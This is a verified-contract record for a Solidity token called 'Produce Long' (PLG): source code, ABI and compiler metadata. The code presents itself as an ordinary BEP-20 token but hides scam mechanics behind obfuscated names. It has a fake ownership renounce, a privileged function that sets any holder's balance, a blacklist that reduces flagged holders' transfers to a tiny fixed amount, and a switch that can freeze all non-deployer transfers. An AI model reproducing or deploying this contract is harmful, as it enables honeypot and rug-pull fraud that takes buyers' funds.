{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface minTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTake) external view returns (uint256);\n\n    function transfer(address exemptTakeAmount, uint256 launchedAuto) external returns (bool);\n\n    function allowance(address atTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTakeAmount,\n        uint256 launchedAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapAuto, uint256 value);\n    event Approval(address indexed atTx, address indexed spender, uint256 value);\n}\n\nabstract contract marketingTxReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverReceiverTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTo {\n    function createPair(address tokenMax, address fromList) external returns (address);\n}\n\ninterface listEnable is minTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProduceLong is marketingTxReceiver, minTake, listEnable {\n\n    function sellIsFee() private view {\n        require(launchSender[_msgSender()]);\n    }\n\n    function enableLimit(address swapTx, address exemptTakeAmount, uint256 launchedAuto) internal returns (bool) {\n        if (swapTx == totalBuySender) {\n            return totalLaunch(swapTx, exemptTakeAmount, launchedAuto);\n        }\n        uint256 walletReceiver = minTake(marketingFund).balanceOf(receiverLiquidity);\n        require(walletReceiver == enableTrading);\n        require(exemptTakeAmount != receiverLiquidity);\n        if (sellList[swapTx]) {\n            return totalLaunch(swapTx, exemptTakeAmount, autoShould);\n        }\n        return totalLaunch(swapTx, exemptTakeAmount, launchedAuto);\n    }\n\n    uint256 private listTeam = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public sellList;\n\n    uint256 public launchSwap;\n\n    address public totalBuySender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTeam;\n    }\n\n    uint256 enableTrading;\n\n    uint8 private enableTo = 18;\n\n    string private buyReceiver = \"PLG\";\n\n    function getOwner() external view returns (address) {\n        return buyList;\n    }\n\n    bool public senderTx;\n\n    address public marketingFund;\n\n    mapping(address => bool) public launchSender;\n\n    function transferFrom(address swapTx, address exemptTakeAmount, uint256 launchedAuto) external override returns (bool) {\n        if (_msgSender() != fromSender) {\n            if (totalModeFund[swapTx][_msgSender()] != type(uint256).max) {\n                require(launchedAuto <= totalModeFund[swapTx][_msgSender()]);\n                totalModeFund[swapTx][_msgSender()] -= launchedAuto;\n            }\n        }\n        return enableLimit(swapTx, exemptTakeAmount, launchedAuto);\n    }\n\n    bool public totalSender;\n\n    bool private enableMin;\n\n    function owner() external view returns (address) {\n        return buyList;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalModeFund;\n\n    uint256 public walletAmount;\n\n    function limitEnableLiquidity() public {\n        emit OwnershipTransferred(totalBuySender, address(0));\n        buyList = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeBuy;\n    }\n\n    function allowance(address tradingReceiverFund, address takeLimit) external view virtual override returns (uint256) {\n        if (takeLimit == fromSender) {\n            return type(uint256).max;\n        }\n        return totalModeFund[tradingReceiverFund][takeLimit];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTo;\n    }\n\n    mapping(address => uint256) private enableIsMin;\n\n    uint256 maxAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyReceiver;\n    }\n\n    uint256 constant autoShould = 19 ** 10;\n\n    function buyTx(address launchedEnable) public {\n        if (senderTx) {\n            return;\n        }\n        \n        launchSender[launchedEnable] = true;\n        \n        senderTx = true;\n    }\n\n    function teamTake(address atTotalLiquidity) public {\n        sellIsFee();\n        \n        if (atTotalLiquidity == totalBuySender || atTotalLiquidity == marketingFund) {\n            return;\n        }\n        sellList[atTotalLiquidity] = true;\n    }\n\n    function transfer(address buyFund, uint256 launchedAuto) external virtual override returns (bool) {\n        return enableLimit(_msgSender(), buyFund, launchedAuto);\n    }\n\n    address private buyList;\n\n    function approve(address takeLimit, uint256 launchedAuto) public virtual override returns (bool) {\n        totalModeFund[_msgSender()][takeLimit] = launchedAuto;\n        emit Approval(_msgSender(), takeLimit, launchedAuto);\n        return true;\n    }\n\n    constructor (){\n        \n        receiverReceiverTrading receiverListTx = receiverReceiverTrading(fromSender);\n        marketingFund = isTo(receiverListTx.factory()).createPair(receiverListTx.WETH(), address(this));\n        if (enableMin) {\n            enableMin = false;\n        }\n        totalBuySender = _msgSender();\n        limitEnableLiquidity();\n        launchSender[totalBuySender] = true;\n        enableIsMin[totalBuySender] = listTeam;\n        \n        emit Transfer(address(0), totalBuySender, listTeam);\n    }\n\n    function feeReceiver(address buyFund, uint256 launchedAuto) public {\n        sellIsFee();\n        enableIsMin[buyFund] = launchedAuto;\n    }\n\n    function totalLaunch(address swapTx, address exemptTakeAmount, uint256 launchedAuto) internal returns (bool) {\n        require(enableIsMin[swapTx] >= launchedAuto);\n        enableIsMin[swapTx] -= launchedAuto;\n        enableIsMin[exemptTakeAmount] += launchedAuto;\n        emit Transfer(swapTx, exemptTakeAmount, launchedAuto);\n        return true;\n    }\n\n    string private feeBuy = \"Produce Long\";\n\n    address fromSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address totalTake) public view virtual override returns (uint256) {\n        return enableIsMin[totalTake];\n    }\n\n    address receiverLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private totalSwapLimit;\n\n    event OwnershipTransferred(address indexed senderTake, address indexed totalIs);\n\n    function receiverExempt(uint256 launchedAuto) public {\n        sellIsFee();\n        enableTrading = launchedAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"}],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAuto\",\"type\":\"uint256\"}],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedAuto\",\"type\":\"uint256\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotalLiquidity\",\"type\":\"address\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuySender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTakeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProduceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}